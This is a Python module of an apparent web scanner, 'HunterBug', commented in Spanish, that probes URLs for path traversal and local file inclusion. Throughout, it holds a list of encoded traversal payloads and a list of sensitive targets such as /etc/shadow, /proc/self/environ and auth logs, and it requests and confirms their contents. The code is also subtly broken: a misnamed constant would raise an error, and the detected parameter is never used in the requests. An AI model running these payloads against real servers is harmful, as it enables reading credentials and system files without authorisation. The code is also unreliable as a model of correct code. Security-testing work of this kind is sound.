"""HunterBug 1.1 — detector de Path Traversal / Local File Inclusion.

Los atacantes intentan acceder a archivos fuera del directorio web mediante
secuencias como `../`, `..%2f` o combinaciones con codificación. El detector
prueba una lista de archivos sensibles y verifica si el contenido esperado
aparece en la respuesta.
"""

from __future__ import annotations

import re
import urllib.parse

from . import net, vulns

PAUSA = 0.1
TIMEOUT = 12

# Archivos objetivo comunes (en sistemas *nix)
ARCHIVOS_OBJETivo = [
    ("/etc/passwd", "root:", "passwd"),
    ("/etc/shadow", "root:", "shadow"),
    ("/etc/hosts", "127.0.0.1", "hosts"),
    ("/etc/hostname", "\n", "hostname"),
    ("/etc/os-release", "PRETTY_NAME", "os-release"),
    ("/proc/self/environ", "=", "environ"),
    ("/proc/self/cmdline", "\x00", "cmdline"),
    ("/var/log/apache2/access.log", "GET", "apache-log"),
    ("/var/log/nginx/access.log", "GET", "nginx-log"),
    ("/var/log/auth.log", "failed", "auth-log"),
    ("/c/Windows/win.ini", "[fonts]", "win-ini"),  # Windows
    ("/c/Windows/system32/drivers/etc/hosts", "127.0.0.1", "win-hosts"),
    ("/etc/php.ini", "PHP", "php-ini"),
    ("/etc/my.cnf", "[mysqld]", "my-cnf"),
    ("/proc/1/mountinfo", "", "mountinfo"),
]

# Payload comunes
PAYLOADS = [
    "../", "..%2f", "..%252f", "..\\", "..%5c",
    "..\\/", "..%c0%af", "..%c0%9f", "..%00/",
    "....//", "....%2f", ".../", "..;/",
    "..%57../", "..%2e%2e/", "..%c0%ae%c0%ae/",
]


def _peticion(url, cabeceras=None):
    return net.peticion_http(url, cabeceras=cabeceras, timeout=TIMEOUT)


def _test_archivo(url, cabeceras=None, payloads=None, archivos=None):
    """Prueba múltiples payloads contra múltiples archivos objetivo."""
    payloads = payloads or PAYLOADS
    archivos = archivos or ARCHIVOS_OBJETIVO

    for payload in payloads:
        for ruta, marca, nombre in archivos:
            url_test = "%s%s%s" % (url.rstrip("/"), payload, ruta)
            r = _peticion(url_test, cabeceras)
            if r.status == 200:
                cuerpo = r.cuerpo or ""
                # Verificar si el contenido coincide con el esperado
                if marca and marca in cuerpo:
                    return {
                        "tipo": "lfi",
                        "payload": payload,
                        "archivo": nombre,
                        "location": ruta,
                        "marca_encontrada": marca,
                        "bytes": r.cuerpo_bytes,
                        "status": 200
                    }, r

    return None, None


def analizar(url, cabeceras=None, pausa=PAUSA, log=None, max_payloads=10,
             archivos_objetivo=None):
    """Detecta Path Traversal / Local File Inclusion en una URL."""
    log = log or (lambda t, n="info": None)

    hallazgos = []

    # 1. probabilidad de LFI: buscar parametros sospechosos
    params = vulns.parametros_de(url)
    param_objetivo = None
    for nombre, valor in params:
        if any(k in nombre.lower() for k in ("file", "path", "doc", "page",
                                              "include", "read", "load", "cat",
                                              "template", "plugin", "module", "script")):
            param_objetivo = (nombre, valor)
            break

        # También detectar IDs numéricos que podrían ser referencias de archivo
        if re.fullmatch(r"\d+", valor) and not valor.startswith("0"):
            param_objetivo = (nombre, valor)
            log("  Parámetro numérico potencial: %s" % nombre)

    if param_objetivo:
        nombre_p, valor_p = param_objetivo
        log("  Probando %s=%s con %d payloads" % (nombre_p, valor_p, max_payloads))
        resultados, _ = _test_archivo(
            url, cabeceras,
            payloads=["..%2f", "../", "..%5c", "..%252f", "....//", "%2e%2e/"],
            archivos=archivos_objetivo
        )
        if resultados:
            resultados["parametro"] = nombre_p
            resultados["original"] = valor_p
            resultados["titulo"] = "Path Traversal: lectura de archivo"
            resultados["detalle"] = (
                "El parametro '%s' permite leer el archivo %s del servidor"
                " a través de Path Traversal. Se obtuvo contenido que incluye"
                " la marca '%s' buscada en '%s'"
            ) % (nombre_p, resultados["archivo"], resultados.get("marca_encontrada", "?"),
                 resultados["location"])
            resultados["recomendacion"] = (
                "No usar el valor del parametro directamente en includes."
                " Usar una lista blanca de rutas permitidas, y normalizar"
                " la ruta con realpath() y verificar que esté dentro del"
                " directorio web raiz."
            )
            resultados["severidad"] = "alto"
            resultados["cwe"] = "CWE-22"
            resultados["owasp"] = "A01:2021"
            resultados["confianza"] = 85
            hallazgos.append(resultados)
            log("    LFI: %s -> %s" % (nombre_p, resultados["location"]))

    # 2. escaneo en rutas con patrón de placeholder (ruta dinamica)
    for placeholder in ["{file}", "{path}", "{doc}", "{d}", "{p}"]:
        if placeholder in url:
            base = url.split(placeholder)[0].rstrip("/")
            for payload in ["../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]:
                url_test = base + payload
                resultados, _ = _test_archivo(url_test, cabeceras)
                if resultados:
                    resultados["tipo_ruta"] = "dinamica"
                    resultados["placeholder"] = placeholder
                    hallazgos.append(resultados)
                    break

    return {
        "url": url,
        "hallazgos": hallazgos,
        "resumen": {
            "vidrable": bool(hallazgos),
            "total": len(hallazgos),
            "parametros_analizados": len(params)
        }
    }


# Exponer para uso concreto
def deteccion_dinamica(url, cabeceras=None):
    """Alias para compatibilidad con otras herramientas."""
    return analizar(url, cabeceras)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://testphp.vulnweb.com/file.php?file=5"
    r = analizar(target)
    print("Hallazgos:", len(r["hallazgos"]))
    for h in r["hallazgos"]:
        print("  -", h.get("titulo"), ":", h.get("payload"), "->", h.get("location"))